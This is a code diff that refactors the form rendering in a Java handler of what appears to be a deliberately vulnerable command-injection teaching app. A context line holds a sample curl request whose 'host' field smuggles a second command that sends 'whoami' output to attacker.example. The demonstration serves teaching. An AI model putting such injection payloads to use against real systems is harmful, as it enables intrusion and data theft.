@@ -7,6 +7,7 @@ import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
 
 import java.io.BufferedReader;
+import java.util.Map;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.regex.Pattern;
@@ -141,26 +142,13 @@ public class RceHandler implements IRouteHandler {
              "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; curl http://attacker.example/?d=$(whoami)'"},
         });
 
-        String vulnForm = """
-            <form method="POST" action="/rce/vulnerable" class="space-y-3">
-              <label class="block text-sm font-medium text-gray-700">Hostname to ping</label>
-              <input type="text" name="host" placeholder="e.g. localhost; ls"
-                value="%s"
-                class="w-full border border-gray-300 rounded px-3 py-2 text-sm font-mono"/>
-              <button class="bg-red-600 text-white px-4 py-2 rounded text-sm hover:bg-red-700">Ping (Vulnerable)</button>
-            </form>
-            """.formatted(TemplateEngine.escape(vulnInput != null ? vulnInput : ""));
+        String vulnForm = TemplateEngine.render("forms/rce-vulnerable.html", Map.of(
+            "value", TemplateEngine.escape(vulnInput != null ? vulnInput : "")
+        ));
 
-        String safeForm = """
-            <form method="POST" action="/rce/mitigated" class="space-y-3">
-              <label class="block text-sm font-medium text-gray-700">Hostname to ping</label>
-              <input type="text" name="host2" placeholder="e.g. localhost"
-                value="%s"
-                class="w-full border border-gray-300 rounded px-3 py-2 text-sm font-mono"/>
-              <p class="text-xs text-gray-500 mt-1">Only <code>[a-zA-Z0-9._-]</code> allowed — no shell metacharacters.</p>
-              <button class="bg-green-600 text-white px-4 py-2 rounded text-sm hover:bg-green-700">Ping (Safe)</button>
-            </form>
-            """.formatted(TemplateEngine.escape(safeInput != null ? safeInput : ""));
+        String safeForm = TemplateEngine.render("forms/rce-mitigated.html", Map.of(
+            "value", TemplateEngine.escape(safeInput != null ? safeInput : "")
+        ));
 
         String panels = """
             <div class="grid md:grid-cols-2 gap-6">%s%s</div>
